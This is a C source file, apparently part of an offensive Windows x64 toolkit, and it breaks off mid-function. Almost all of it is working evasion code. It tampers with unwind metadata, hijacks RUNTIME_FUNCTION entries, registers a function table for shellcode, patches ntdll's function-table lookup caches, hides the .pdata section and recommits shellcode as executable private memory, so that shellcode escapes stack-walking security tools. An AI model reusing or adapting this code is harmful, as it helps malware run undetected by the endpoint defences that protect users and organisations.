/*
    <Program Name>
    Copyright (C) <YEAR> <YOUR NAME>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

#include "pch.h"
#include "context.h"
#include "dbg.h"
#include "unwind.h"
#include "resolver.h"
#include "primitives.h"
#include "stackutils.h"
#include "stacksearch.h"
#include "byoud.h"
#include <DbgHelp.h>
#include <psapi.h>

#pragma comment(lib, "DbgHelp.lib")

#pragma comment(linker, "/EXPORT:ShieldedExecution")
#pragma comment(linker, "/EXPORT:CallGate=CallGate")

/* ---------------------------------------------------------------
 * qsort comparator (C-compatible, replaces C++ lambda)
 * --------------------------------------------------------------- */
static int CompareRuntimeFunctions(const void* a, const void* b)
{
    DWORD ba = ((PRUNTIME_FUNCTION)a)->BeginAddress;
    DWORD bb = ((PRUNTIME_FUNCTION)b)->BeginAddress;
    return (ba > bb) - (ba < bb);
}

/*
 * Util to check if stack cookies are present in the current module
 */

BOOL StackCookiesEnabled()
{
    return ModuleHasStackCookies(GetCurrentModule());
}

/* ---------------------------------------------------------------
 * BuildCallGateParamsFromArray / BuildCallGateParams
 * --------------------------------------------------------------- */
PCALLGATE_PARAMS BuildCallGateParamsFromArray(PVOID pFunction, DWORD dwFrameSize,
    UINT64 argc, PUINT64 argv)
{
    SIZE_T size = sizeof(CALLGATE_PARAMS) + (argc > 0 ? (argc - 1) * sizeof(UINT64) : 0);
    PCALLGATE_PARAMS params = (PCALLGATE_PARAMS)malloc(size);
    UINT64 i;
    if (params == NULL) return NULL;
    params->pFunction = (UINT64)pFunction;
    params->dwMinimumFrameSize = dwFrameSize;
    params->argc = argc;
    for (i = 0; i < argc; i++)
        params->argv[i] = argv[i];
    return params;
}

PCALLGATE_PARAMS BuildCallGateParams(PVOID pFunction, DWORD dwFrameSize, UINT64 argc, ...)
{
    SIZE_T size = sizeof(CALLGATE_PARAMS) + (argc > 0 ? (argc - 1) * sizeof(UINT64) : 0);
    PCALLGATE_PARAMS params = (PCALLGATE_PARAMS)malloc(size);
    UINT64  i;
    va_list args;
    if (params == NULL) return NULL;
    params->pFunction = (UINT64)pFunction;
    params->dwMinimumFrameSize = dwFrameSize;
    params->argc = argc;
    va_start(args, argc);
    for (i = 0; i < argc; i++)
        params->argv[i] = va_arg(args, UINT64);
    va_end(args);
    return params;
}

/* ---------------------------------------------------------------
 * TamperUnwind
 * --------------------------------------------------------------- */
BOOL TamperUnwind(PUNWIND_INFO tInfo, DWORD dwNewSize, DWORD* pdwOldSize)
{
    DWORD        _ignore = 0;
    DWORD        frameSize;
    int          lastCode = -1;
    UBYTE        unwindOp = 0;
    UBYTE        opInfo = 0;
    DWORD        allocSizeBytes = 0;
    DWORD        unwindSize;
    PUNWIND_INFO raw;
    DWORD        newAllocBytes;
    BOOL         success = FALSE;
    int          i;

    if (pdwOldSize != NULL) *pdwOldSize = 0;

    frameSize = GetStackFrameSize(NULL, tInfo, &_ignore);
    if (frameSize == 0) return FALSE;
    printf("Stack Frame size: 0x%08x\n", frameSize);

    for (i = 0; i < tInfo->CountOfCodes; i++) {
        unwindOp = tInfo->UnwindCode[i].UnwindOp;
        opInfo = tInfo->UnwindCode[i].OpInfo;
        if (unwindOp == UWOP_ALLOC_SMALL) {
            lastCode = i;
            allocSizeBytes = (DWORD)(opInfo + 1) * 8;
            break;
        }
        else if (unwindOp == UWOP_ALLOC_LARGE) {
            lastCode = i;
            if (opInfo == 0) {
                allocSizeBytes = (DWORD)tInfo->UnwindCode[i + 1].FrameOffset * 8;
            }
            else if (opInfo == 1) {
                allocSizeBytes = (DWORD)tInfo->UnwindCode[i + 1].FrameOffset |
                    ((DWORD)tInfo->UnwindCode[i + 2].FrameOffset << 16);
            }
            else {
                return FALSE;
            }
            break;
        }
    }

    if (lastCode < 0) return FALSE;
    if (pdwOldSize != NULL) *pdwOldSize = allocSizeBytes;

    if (unwindOp == UWOP_ALLOC_SMALL &&
        (tInfo->CountOfCodes * sizeof(UNWIND_CODE)) % 4 == 0)
        return FALSE;

    unwindSize = SizeOfUnwind(tInfo);
    raw = (PUNWIND_INFO)malloc(unwindSize + sizeof(UNWIND_CODE) * 2);
    if (raw == NULL) return FALSE;
    internal_memset(raw, 0, unwindSize + sizeof(UNWIND_CODE) * 2);

    newAllocBytes = allocSizeBytes + dwNewSize;

    if (unwindOp == UWOP_ALLOC_SMALL) {
        int      remainingCodes;
        DWORD    oldCodesAligned, newCodesAligned, tailSize;
        uint8_t* oldTail, * newTail;

        if (newAllocBytes > 524280) { free(raw); return FALSE; }

        internal_memcpy(raw, tInfo, 4);
        raw->Flags = UNW_FLAG_UHANDLER;
        raw->SizeOfProlog = tInfo->SizeOfProlog;
        raw->CountOfCodes = tInfo->CountOfCodes + 1;

        if (lastCode > 0)
            internal_memcpy(&raw->UnwindCode[0], &tInfo->UnwindCode[0],
                lastCode * sizeof(UNWIND_CODE));

        raw->UnwindCode[lastCode].CodeOffset = tInfo->UnwindCode[lastCode].CodeOffset;
        raw->UnwindCode[lastCode].UnwindOp = UWOP_ALLOC_LARGE;
        raw->UnwindCode[lastCode].OpInfo = 0;
        raw->UnwindCode[lastCode + 1].FrameOffset = (USHORT)(newAllocBytes / 8);

        printf("Size: 0x%08x + 0x%08x = 0x%08x (FrameOffset: 0x%04x)\n",
            allocSizeBytes, dwNewSize, newAllocBytes, (USHORT)(newAllocBytes / 8));

        remainingCodes = tInfo->CountOfCodes - lastCode - 1;
        if (remainingCodes > 0)
            internal_memcpy(&raw->UnwindCode[lastCode + 2],
                &tInfo->UnwindCode[lastCode + 1],
                remainingCodes * sizeof(UNWIND_CODE));

        oldCodesAligned = ALIGN_UP(tInfo->CountOfCodes * sizeof(UNWIND_CODE), 4);
        newCodesAligned = ALIGN_UP(raw->CountOfCodes * sizeof(UNWIND_CODE), 4);
        oldTail = (uint8_t*)&tInfo->UnwindCode[0] + oldCodesAligned;
        newTail = (uint8_t*)&raw->UnwindCode[0] + newCodesAligned;
        tailSize = unwindSize - (4 + oldCodesAligned);
        if (tailSize > 0) internal_memcpy(newTail, oldTail, tailSize);

        success = TRUE;
    }
    else {
        internal_memcpy(raw, tInfo, unwindSize);
        raw->Flags = UNW_FLAG_UHANDLER;
        if (opInfo == 0) {
            if (newAllocBytes > 524280) { free(raw); return FALSE; }
            raw->UnwindCode[lastCode + 1].FrameOffset = (USHORT)(newAllocBytes / 8);
        }
        else if (opInfo == 1) {
            raw->UnwindCode[lastCode + 1].FrameOffset = (USHORT)(newAllocBytes & 0xFFFF);
            raw->UnwindCode[lastCode + 2].FrameOffset = (USHORT)(newAllocBytes >> 16);
        }
        success = TRUE;
    }

    if (success) {
        DWORD finalSize = SizeOfUnwind(raw);
        internal_memcpy(tInfo, raw, finalSize);
        success = (internal_memcmp(tInfo, raw, finalSize) == 0);
    }

    free(raw);
    return success;
}

/* ---------------------------------------------------------------
 * ChangeUnwind
 * --------------------------------------------------------------- */
BOOL ChangeUnwind(PUNWIND_INFO tInfo, DWORD dwNewSize, DWORD* pdwOldSize)
{
    BOOL   success = FALSE;
    DWORD  _ignore = 0;
    DWORD  frameSize;
    DWORD  lastCode = 0;
    UBYTE  unwindOp = 0;
    UBYTE  opInfo = 0;
    USHORT allocSize = 0;
    DWORD  unwindSize;
    PUNWIND_INFO raw;
    int    i;

    if (pdwOldSize != NULL) *pdwOldSize = 0;

    frameSize = GetStackFrameSize(NULL, tInfo, &_ignore);
    if (frameSize == 0) return FALSE;
    if (pdwOldSize != NULL) *pdwOldSize = frameSize;
    printf("Stack Frame size: 0x%08x\n", frameSize);

    for (i = 0; i < tInfo->CountOfCodes; i++) {
        lastCode = i;
        unwindOp = tInfo->UnwindCode[lastCode].UnwindOp;
        opInfo = tInfo->UnwindCode[lastCode].OpInfo;
        if (unwindOp == UWOP_ALLOC_SMALL) {
            allocSize = (USHORT)((tInfo->UnwindCode[lastCode].OpInfo + 1));
            break;
        }
        else if (unwindOp == UWOP_ALLOC_LARGE) {
            allocSize = 0;
            if (tInfo->UnwindCode[i + 1].OpInfo == 0) {
                allocSize = tInfo->UnwindCode[i + 1].FrameOffset * 8;
            }
            else if (tInfo->UnwindCode[i + 1].OpInfo == 1) {
                allocSize = tInfo->UnwindCode[i + 1].FrameOffset +
                    (tInfo->UnwindCode[i + 2].FrameOffset << 16);
            }
            else {
                return FALSE;
            }
            break;
        }
    }

    if (unwindOp == UWOP_ALLOC_SMALL &&
        (tInfo->CountOfCodes * sizeof(UNWIND_CODE)) % 4 == 0)
        return FALSE;

    unwindSize = SizeOfUnwind(tInfo);
    raw = (PUNWIND_INFO)malloc(unwindSize + sizeof(UNWIND_CODE) * 2);
    if (raw == NULL) return FALSE;
    internal_memset(raw, 0, unwindSize);

    if (unwindOp == UWOP_ALLOC_SMALL) {
        DWORD    newAllocBytes = (allocSize * 8) + dwNewSize;
        DWORD    oldCodesBytes = tInfo->CountOfCodes * sizeof(UNWIND_CODE);
        DWORD    newCodesBytes = (tInfo->CountOfCodes + 1) * sizeof(UNWIND_CODE);
        DWORD    oldCodesAligned = ALIGN_UP(oldCodesBytes, 4);
        DWORD    newCodesAligned = ALIGN_UP(newCodesBytes, 4);
        DWORD    tailSize;
        uint8_t* oldTail, * newTail;

        if (newAllocBytes > 524280) { free(raw); return FALSE; }

        internal_memcpy(raw, (UBYTE*)tInfo, 4);
        raw->Flags = UNW_FLAG_UHANDLER;
        raw->SizeOfProlog = 0x07;

        if (lastCode > 0)
            internal_memcpy(&raw->UnwindCode, &tInfo->UnwindCode,
                lastCode * sizeof(UNWIND_CODE));

        raw->UnwindCode[lastCode].UnwindOp = UWOP_ALLOC_LARGE;
        raw->CountOfCodes = tInfo->CountOfCodes + 1;
        raw->UnwindCode[lastCode].OpInfo = 0;
        raw->UnwindCode[lastCode + 1].OpInfo = 0;
        raw->UnwindCode[lastCode + 1].FrameOffset = (USHORT)(allocSize + (dwNewSize / 8));

        printf("Excepted Size: 0x%08x + 0x%08x = 0x%08x (0x%08x)\n",
            allocSize * 8, dwNewSize, (allocSize * 8) + dwNewSize,
            allocSize + (dwNewSize / 8));

        if (lastCode < (int)tInfo->CountOfCodes)
            memcpy(&raw->UnwindCode[lastCode + 2], &tInfo->UnwindCode[lastCode + 1],
                (tInfo->CountOfCodes - lastCode - 1) * sizeof(UNWIND_CODE));

        oldTail = (uint8_t*)&tInfo->UnwindCode[0] + oldCodesAligned;
        newTail = (uint8_t*)&raw->UnwindCode[0] + newCodesAligned;
        tailSize = unwindSize - (4 + oldCodesAligned);
        if (tailSize > 0) internal_memcpy(newTail, oldTail, tailSize);
    }
    else {
        internal_memcpy(raw, (UBYTE*)tInfo, unwindSize);
        raw->Flags = UNW_FLAG_UHANDLER;
        if (tInfo->UnwindCode[lastCode + 1].OpInfo == 0) {
            raw->UnwindCode[lastCode + 1].FrameOffset = allocSize + (UBYTE)(dwNewSize / 8);
        }
        else if (tInfo->UnwindCode[lastCode + 1].OpInfo == 1) {
            raw->UnwindCode[lastCode + 1].FrameOffset = (allocSize + dwNewSize) & 0xFFFF;
            raw->UnwindCode[lastCode + 2].FrameOffset = (allocSize + dwNewSize) >> 16;
        }
        else {
            free(raw);
            return FALSE;
        }
    }

    internal_memcpy((UBYTE*)tInfo, raw, unwindSize);
    success = internal_memcmp((UBYTE*)tInfo, raw, unwindSize) == 0;
    free(raw);
    return success;
}

/* ---------------------------------------------------------------
 * ChangeUnwindInfoExceptionAddress
 * --------------------------------------------------------------- */
BOOL ChangeUnwindInfoExceptionAddress(HMODULE hModule, PUNWIND_INFO tInfo, DWORD newAddress)
{
    PMEMORY_BASIC_INFORMATION pMemInfo;
    LPCVOID exceptionCodeAddress;
    DWORD   executableFlags;

    pMemInfo = (PMEMORY_BASIC_INFORMATION)malloc(sizeof(MEMORY_BASIC_INFORMATION64));
    if (pMemInfo == NULL) return FALSE;

    exceptionCodeAddress = (LPCVOID)((UINT64)hModule + newAddress);
    VirtualQuery(exceptionCodeAddress, pMemInfo, sizeof(pMemInfo));

    if (pMemInfo->State != MEM_COMMIT) { free(pMemInfo); return FALSE; }

    executableFlags = PAGE_EXECUTE | PAGE_EXECUTE_READ |
        PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY;

    if (pMemInfo->Protect & executableFlags) {
        tInfo->ExceptionHandler = newAddress;
        free(pMemInfo);
        return tInfo->ExceptionHandler == newAddress;
    }

    free(pMemInfo);
    return FALSE;
}

/* ---------------------------------------------------------------
 * HijackRuntimeFunction  (original, unchanged)
 * --------------------------------------------------------------- */
BOOL HijackRuntimeFunction(HMODULE hModule, PRUNTIME_FUNCTION pRuntimeFunction,
    DWORD dwDesiredSize, BOOL strict, PDWORD pdwActualSize,
    PRUNTIME_FUNCTION_BACKUP* ppRuntimeFunctionBackup)
{
    PRUNTIME_FUNCTION targetFunction;
    PRUNTIME_FUNCTION table;
    DWORD pdataSize, count, i;

    targetFunction = SearchRtFunctionWithSpecificSize(
        hModule, dwDesiredSize, strict, pdwActualSize);
    if (targetFunction == NULL) return FALSE;

    *ppRuntimeFunctionBackup = SaveRuntimeFunction(targetFunction);
    if (*ppRuntimeFunctionBackup == NULL) return FALSE;

    internal_memcpy(&targetFunction->BeginAddress,
        &pRuntimeFunction->BeginAddress, sizeof(DWORD));
    internal_memcpy(&targetFunction->EndAddress,
        &pRuntimeFunction->EndAddress, sizeof(DWORD));

    if (internal_memcmp(&pRuntimeFunction->BeginAddress,
        &targetFunction->BeginAddress, sizeof(DWORD)) != 0 ||
        internal_memcmp(&pRuntimeFunction->EndAddress,
            &targetFunction->EndAddress, sizeof(DWORD)) != 0)
        return FALSE;

    pdataSize = 0;
    table = (PRUNTIME_FUNCTION)GetExceptionDirectoryAddress(hModule, &pdataSize);
    count = pdataSize / sizeof(RUNTIME_FUNCTION);
    qsort(table, count, sizeof(RUNTIME_FUNCTION), CompareRuntimeFunctions);

    for (i = 0; i < count; i++) {
        if (table[i].BeginAddress == pRuntimeFunction->BeginAddress) {
            (*ppRuntimeFunctionBackup)->pOriginalLocation = &table[i];
            break;
        }
    }
    return TRUE;
}

/* ---------------------------------------------------------------
 * HijackUnwindInfoAddress  (original, unchanged)
 * --------------------------------------------------------------- */
BOOL HijackUnwindInfoAddress(HMODULE hModule, PRUNTIME_FUNCTION pRuntimeFunction,
    DWORD dwDesiredSize, BOOL strict, PDWORD pdwActualSize,
    PRUNTIME_FUNCTION_BACKUP* ppRuntimeFunctionBackup)
{
    PRUNTIME_FUNCTION targetFunction = SearchRtFunctionWithSpecificSize(
        hModule, dwDesiredSize, strict, pdwActualSize);
    if (targetFunction == NULL) return FALSE;

    *ppRuntimeFunctionBackup = SaveRuntimeFunction(pRuntimeFunction);
    if (*ppRuntimeFunctionBackup == NULL) return FALSE;

    internal_memcpy(&pRuntimeFunction->UnwindData,
        &targetFunction->UnwindData, sizeof(DWORD));

    if (internal_memcmp(&pRuntimeFunction->UnwindData,
        &targetFunction->UnwindData, sizeof(DWORD)) != 0)
        return FALSE;

    return TRUE;
}

/* ---------------------------------------------------------------
 * RuntimeFunctionInstallCustomUnwind  (original, unchanged)
 * --------------------------------------------------------------- */
BOOL RuntimeFunctionInstallCustomUnwind(ULONG64 BaseAddress, DWORD dwShcOffset,
    DWORD dwShcSize, DWORD dwFrameSize, PDWORD pdwActualSize,
    PRUNTIME_FUNCTION_BACKUP* ppRuntimeFunctionBackup)
{
    DWORD             unwindRVA = ALIGN_UP_POW2(dwShcOffset + dwShcSize, 64);
    PUNWIND_INFO      pUnwindInfo = (PUNWIND_INFO)(BaseAddress + unwindRVA);
    DWORD             unwindSize;
    PRUNTIME_FUNCTION FunctionTable;

    unwindSize = CreateUnwind(pUnwindInfo, dwFrameSize, 1, FALSE);
    if (unwindSize == 0) { printf("[!] CreateUnwind failed\n"); return FALSE; }

    printf("[*] Created UNWIND_INFO @ 0x%016llX (RVA: 0x%08X) size=0x%X CountOfCodes=%d\n",
        (ULONG64)pUnwindInfo, unwindRVA, unwindSize, pUnwindInfo->CountOfCodes);

    FunctionTable = (PRUNTIME_FUNCTION)malloc(sizeof(RUNTIME_FUNCTION));
    if (FunctionTable == NULL) return FALSE;

    *ppRuntimeFunctionBackup = SaveRuntimeFunction(FunctionTable);
    if (*ppRuntimeFunctionBackup == NULL) { free(FunctionTable); return FALSE; }

    FunctionTable->BeginAddress = dwShcOffset;
    FunctionTable->EndAddress = dwShcOffset + dwShcSize;
    FunctionTable->UnwindData = unwindRVA;

    printf("[*] Registering shellcode RUNTIME_FUNCTION:\n");
    printf("    BaseAddress  : 0x%016llX\n", BaseAddress);
    printf("    BeginAddress : 0x%08X (abs: 0x%016llX)\n",
        FunctionTable->BeginAddress, BaseAddress + FunctionTable->BeginAddress);
    printf("    EndAddress   : 0x%08X (abs: 0x%016llX)\n",
        FunctionTable->EndAddress, BaseAddress + FunctionTable->EndAddress);
    printf("    UnwindData   : 0x%08X (abs: 0x%016llX)\n",
        FunctionTable->UnwindData, BaseAddress + FunctionTable->UnwindData);

    if (!RtlAddFunctionTable(FunctionTable, 1, BaseAddress)) {
        printf("[!] RtlAddFunctionTable failed\n");
        free(FunctionTable);
        return FALSE;
    }

    printf("[+] RtlAddFunctionTable succeeded\n");
    return TRUE;
}

/* ---------------------------------------------------------------
 * RecommitAsPrivate  (original, unchanged)
 * --------------------------------------------------------------- */
BOOL RecommitAsPrivate(PVOID ShcAddress, SIZE_T ShcSize)
{
    SIZE_T aligned = (ShcSize + 0xFFF) & ~0xFFF;
    PVOID  temp = malloc(aligned);
    PVOID  result;
    MEMORY_BASIC_INFORMATION mbi;

    if (!temp) return FALSE;
    memcpy(temp, ShcAddress, aligned);

    if (!VirtualFree(ShcAddress, aligned, MEM_DECOMMIT)) {
        printf("[!] VirtualFree(MEM_DECOMMIT) failed: 0x%08X\n", GetLastError());
        free(temp);
        return FALSE;
    }

    result = VirtualAlloc(ShcAddress, aligned, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!result) {
        printf("[!] VirtualAlloc(MEM_COMMIT) failed: 0x%08X\n", GetLastError());
        free(temp);
        return FALSE;
    }

    memcpy(ShcAddress, temp, aligned);
    free(temp);

    VirtualQuery(ShcAddress, &mbi, sizeof(mbi));
    printf("[*] Page type after recommit: %s\n",
        mbi.Type == MEM_PRIVATE ? "MEM_PRIVATE (correct)" :
        mbi.Type == MEM_IMAGE ? "MEM_IMAGE (still wrong)" : "MEM_MAPPED");

    return mbi.Type == MEM_PRIVATE;
}

/* ---------------------------------------------------------------
 * Cache invalidation  (original, unchanged)
 * --------------------------------------------------------------- */
BOOL InvalidateFunctionTableCache(PULONG64 pCachedSizeAddr, PDWORD pOldSize)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    ULONG64 fnAddr = (ULONG64)GetProcAddress(hNtdll, "RtlLookupFunctionTable");
    BYTE    buf[128];
    ULONG64 cachedSize = 0;
    DWORD   oldProtect;
    int     i;

    if (!fnAddr) return FALSE;
    memcpy(buf, (PVOID)fnAddr, sizeof(buf));

    for (i = 0; i < 100; i++) {
        if (buf[i] == 0x8B && buf[i + 1] == 0x05) {
            INT32 offset; ULONG64 candidate;
            memcpy(&offset, &buf[i + 2], sizeof(INT32));
            candidate = fnAddr + i + 6 + offset;
            if (candidate > (ULONG64)hNtdll && candidate < (ULONG64)hNtdll + 0x300000) {
                cachedSize = candidate;
                printf("[*] DAT_cached_size @ 0x%016llX = 0x%08X\n",
                    cachedSize, *(DWORD*)cachedSize);
                break;
            }
        }
    }

    if (!cachedSize) { printf("[!] Could not locate cached size field\n"); return FALSE; }

    *pCachedSizeAddr = cachedSize;
    *pOldSize = *(DWORD*)cachedSize;

    VirtualProtect((PVOID)cachedSize, sizeof(DWORD), PAGE_READWRITE, &oldProtect);
    *(DWORD*)cachedSize = 0;
    VirtualProtect((PVOID)cachedSize, sizeof(DWORD), oldProtect, &oldProtect);

    printf("[+] Cache disabled (size 0x%08X -> 0)\n", *pOldSize);
    return TRUE;
}

BOOL InvalidateFunctionEntryCache(PULONG64 pCachedSizeAddr, PDWORD pOldSize)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    ULONG64 fnAddr = (ULONG64)GetProcAddress(hNtdll, "RtlLookupFunctionEntry");
    BYTE    buf[512];
    ULONG64 cachedSize = 0;
    DWORD   oldProtect;
    int     i;

    if (!fnAddr) return FALSE;
    printf("[*] Scanning RtlLookupFunctionEntry @ 0x%016llX\n", fnAddr);
    memcpy(buf, (PVOID)fnAddr, sizeof(buf));

    for (i = 0; i < 480; i++) {
        if (buf[i] == 0x8B && buf[i + 1] == 0x05) {
            INT32 offset; ULONG64 candidate;
            memcpy(&offset, &buf[i + 2], sizeof(INT32));
            candidate = fnAddr + i + 6 + offset;
            if (candidate > (ULONG64)hNtdll && candidate < (ULONG64)hNtdll + 0x300000) {
                printf("[*] DAT_cached_size @ 0x%016llX = 0x%08X\n",
                    candidate, *(DWORD*)candidate);
                cachedSize = candidate;
                break;
            }
        }
    }

    if (!cachedSize) {
        printf("[!] Could not locate cached size in RtlLookupFunctionEntry\n");
        return FALSE;
    }

    *pCachedSizeAddr = cachedSize;
    *pOldSize = *(DWORD*)cachedSize;

    VirtualProtect((PVOID)cachedSize, sizeof(DWORD), PAGE_READWRITE, &oldProtect);
    *(DWORD*)cachedSize = 0;
    VirtualProtect((PVOID)cachedSize, sizeof(DWORD), oldProtect, &oldProtect);

    printf("[+] RtlLookupFunctionEntry cache disabled (0x%08X -> 0)\n", *pOldSize);
    return TRUE;
}

BOOL RestoreFunctionTableCache(ULONG64 oldBase, DWORD oldSize)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    ULONG64 fnAddr = (ULONG64)GetProcAddress(hNtdll, "RtlLookupFunctionTable");
    BYTE    buf[256];
    ULONG64 cachedBase = 0, cachedSize = 0;
    DWORD   oldProtect;
    int     i;

    if (!fnAddr) return FALSE;
    memcpy(buf, (PVOID)fnAddr, sizeof(buf));

    for (i = 0; i < 220; i++) {
        if (buf[i] == 0x48 && buf[i + 1] == 0x3B &&
            (buf[i + 2] == 0x0D || buf[i + 2] == 0x05)) {
            INT32 offset; ULONG64 candidate;
            memcpy(&offset, &buf[i + 3], sizeof(INT32));
            candidate = fnAddr + i + 7 + offset;
            if (candidate > (ULONG64)hNtdll && candidate < (ULONG64)hNtdll + 0x300000) {
                if (!cachedBase) cachedBase = candidate;
                else { cachedSize = candidate; break; }
            }
        }
    }

    if (!cachedBase || !cachedSize) return FALSE;

    VirtualProtect((PVOID)cachedSize, sizeof(DWORD), PAGE_READWRITE, &oldProtect);
    *(DWORD*)cachedSize = oldSize;
    VirtualProtect((PVOID)cachedSize, sizeof(DWORD), oldProtect, &oldProtect);

    printf("[+] Cache restored (size=0x%08X)\n", oldSize);
    return TRUE;
}

/* ---------------------------------------------------------------
 * Pdata helpers  (original, unchanged)
 * --------------------------------------------------------------- */
BOOL ZeroOutPdata(HMODULE hModule, PVOID* ppOriginalPdata, SIZE_T* pPdataSize)
{
    SECTION_INFO si;
    PVOID  pdataBase;
    SIZE_T pdataSize;
    PVOID  backup;

    GetPdataSectionInfo(hModule, &si);
    pdataBase = si.Address;
    pdataSize = (si.Size + 0xFFF) & ~0xFFF;

    printf("[*] .pdata @ 0x%p size 0x%zX\n", pdataBase, pdataSize);

    backup = malloc(pdataSize);
    if (!backup) return FALSE;
    memcpy(backup, pdataBase, pdataSize);

    *ppOriginalPdata = backup;
    *pPdataSize = pdataSize;

    ZeroMemory(pdataBase, pdataSize);
    return TRUE;
}

BOOL RestorePdata(HMODULE hModule, PVOID pOriginalPdata, SIZE_T pdataSize)
{
    SECTION_INFO si;
    PVOID  pdataBase;
    DWORD  oldProtect;

    GetPdataSectionInfo(hModule, &si);
    pdataBase = si.Address;

    VirtualProtect(pdataBase, pdataSize, PAGE_READWRITE, &oldProtect);
    memcpy(pdataBase, pOriginalPdata, pdataSize);
    VirtualProtect(pdataBase, pdataSize, PAGE_READONLY, &oldProtect);

    free(pOriginalPdata);
    printf("[+] .pdata restored\n");
    return TRUE;
}

BOOL SuppressPdataAccess(HMODULE hModule, PDWORD pOldProtect)
{
    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64   nt = (PIMAGE_NT_HEADERS64)((ULONG64)hModule + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    WORD i;

    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".pdata", 6) == 0) {
            PVOID  pdataBase = (PVOID)((ULONG64)hModule + sec[i].VirtualAddress);
            SIZE_T pdataSize = (sec[i].Misc.VirtualSize + 0xFFF) & ~0xFFF;
            if (!VirtualProtect(pdataBase, pdataSize, PAGE_NOACCESS, pOldProtect)) {
                printf("[!] VirtualProtect(PAGE_NOACCESS) failed: 0x%08X\n", GetLastError());
                return FALSE;
            }
            printf("[+] .pdata @ 0x%p size 0x%zX set to PAGE_NOACCESS\n", pdataBase, pdataSize);
            return TRUE;
        }
    }
    printf("[!] .pdata section not found\n");
    return FALSE;
}

BOOL RestorePdataAccess(HMODULE hModule, DWORD oldProtect)
{
    PIMAGE_DOS_HEADER     dos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS64   nt = (PIMAGE_NT_HEADERS64)((ULONG64)hModule + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    WORD  i;
    DWORD dummy;

    for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".pdata", 6) == 0) {
            PVOID  pdataBase = (PVOID)((ULONG64)hModule + sec[i].VirtualAddress);
            SIZE_T pdataSize = (sec[i].Misc.VirtualSize + 0xFFF) & ~0xFFF;
            VirtualProtect(pdataBase, pdataSize, oldProtect, &dummy);
            printf("[+] .pdata protection restored to 0x%08X\n", oldProtect);
            return TRUE;
        }
    }
    return FALSE;
}

/* ---------------------------------------------------------------
 * StackWalk / unwind test helpers  (original, unchanged)
 * --------------------------------------------------------------- */
PVOID CALLBACK FunctionEntryCallback(HANDLE hProcess, ULONG64 addr, ULONG64 context)
{
    ULONG64 imageBase = 0;
    PVOID pEntry = RtlLookupFunctionEntry(addr, &imageBase, NULL);
    if (pEntry)
        printf("[+] FunctionEntryCallback resolved 0x%016llX -> pEntry=0x%p base=0x%016llX\n",
            addr, pEntry, imageBase);
    return pEntry;
}

BOOL TestStackWalk64Callback(CONTEXT* pCtx)
{
    HANDLE       hProcess = GetCurrentProcess();
    HANDLE       hThread = GetCurrentThread();
    STACKFRAME64 sf;
    int          frame = 0;

    SymInitialize(hProcess, NULL, TRUE);
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS | SYMOPT_LOAD_LINES);
    SymRegisterFunctionEntryCallback64(hProcess, FunctionEntryCallback, 0);

    memset(&sf, 0, sizeof(sf));
    sf.AddrPC.Offset = pCtx->Rip;  sf.AddrPC.Mode = AddrModeFlat;
    sf.AddrStack.Offset = pCtx->Rsp;  sf.AddrStack.Mode = AddrModeFlat;
    sf.AddrFrame.Offset = pCtx->Rsp;  sf.AddrFrame.Mode = AddrModeFlat;

    printf("[*] StackWalk64 from RIP=0x%016llX RSP=0x%016llX\n", pCtx->Rip, pCtx->Rsp);
    printf("%-4s %-18s %-18s %s\n", "#", "Child-SP", "RetAddr", "Call Site");

    while (StackWalk64(IMAGE_FILE_MACHINE_AMD64, hProcess, hThread,
        &sf, pCtx, NULL, SymFunctionTableAccess64, SymGetModuleBase64, NULL)) {
        char symBuf[sizeof(SYMBOL_INFO) + MAX_SYM_NAME];
        PSYMBOL_INFO pSym = (PSYMBOL_INFO)symBuf;
        IMAGEHLP_MODULE64 modInfo;
        DWORD64 disp = 0; BOOL symFound, modFound;

        memset(symBuf, 0, sizeof(symBuf));
        pSym->SizeOfStruct = sizeof(SYMBOL_INFO); pSym->MaxNameLen = MAX_SYM_NAME;
        symFound = SymFromAddr(hProcess, sf.AddrPC.Offset, &disp, pSym);
        memset(&modInfo, 0, sizeof(modInfo)); modInfo.SizeOfStruct = sizeof(IMAGEHLP_MODULE64);
        modFound = SymGetModuleInfo64(hProcess, sf.AddrPC.Offset, &modInfo);

        printf("%02d  0x%016llX  0x%016llX  ", frame, sf.AddrStack.Offset, sf.AddrReturn.Offset);
        if (modFound && symFound) printf("%s!%s+0x%llX", modInfo.ModuleName, pSym->Name, disp);
        else if (modFound)        printf("%s!0x%016llX", modInfo.ModuleName, sf.AddrPC.Offset);
        else                      printf("0x%016llX", sf.AddrPC.Offset);
        printf("\n");
        if (++frame > 30 || sf.AddrReturn.Offset == 0) break;
    }

    SymCleanup(hProcess);
    return TRUE;
}

BOOL TestStackWalk64(CONTEXT* pCtx)
{
    HANDLE       hProcess = GetCurrentProcess();
    HANDLE       hThread = GetCurrentThread();
    STACKFRAME64 sf;
    int          frame = 0;

    SymInitialize(hProcess, NULL, TRUE);
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_DEFERRED_LOADS | SYMOPT_LOAD_LINES);

    memset(&sf, 0, sizeof(sf));
    sf.AddrPC.Offset = pCtx->Rip;  sf.AddrPC.Mode = AddrModeFlat;
    sf.AddrStack.Offset = pCtx->Rsp;  sf.AddrStack.Mode = AddrModeFlat;
